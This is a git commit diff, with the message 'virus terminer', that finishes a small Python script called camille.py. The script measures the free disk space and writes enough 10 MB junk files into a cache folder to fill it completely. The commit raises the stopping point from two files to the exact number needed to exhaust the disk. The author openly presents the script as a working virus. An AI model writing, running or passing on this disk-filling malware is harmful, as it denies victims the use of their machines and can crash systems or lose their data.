480e9b3c5be2055c0feae96597b15b3768650c3c
wolffire18 <106351932+wolffire18@users.noreply.github.com>
2023-03-20 13:31:50 +0100

    virus terminer

--- Camille/camille.py
+++ Camille/camille.py
@@ -1,22 +1,29 @@
 import psutil
 import itertools
+import os
 
 letters = 'abcdefghijklmnopqrstuvwxyz'
 x = 0
+dossier = "cache/"
+dossier1 = "cache"
+if not os.path.exists(dossier1):
+    os.mkdir(dossier1)
 
 disk = psutil.disk_usage('/')
 print(f"Total: {disk.total / (1024*1024*1024):.2f} GB")
 print(f"Utilisé: {disk.used / (1024*1024*1024):.2f} GB")
 print(f"Disponible: {disk.free / (1024*1024*1024):.2f} GB")
 
-
+taille = int((disk.free / (1024*1024*1024))/0.010)
+print(int(taille))
 combinations = itertools.combinations(letters, 10)
 
 for combination in combinations:
     x += 1
-    txt = ''.join(combination)
+    txt = dossier + ''.join(combination) + ".txt"
     fichier = open(txt, "w+", encoding="utf-8")
-    fichier.write("z"*1000000000)
+    fichier.write("z"*10240000)
     print(txt)
-    if x > 1:
+    if x > taille:
         break
+fichier.close()
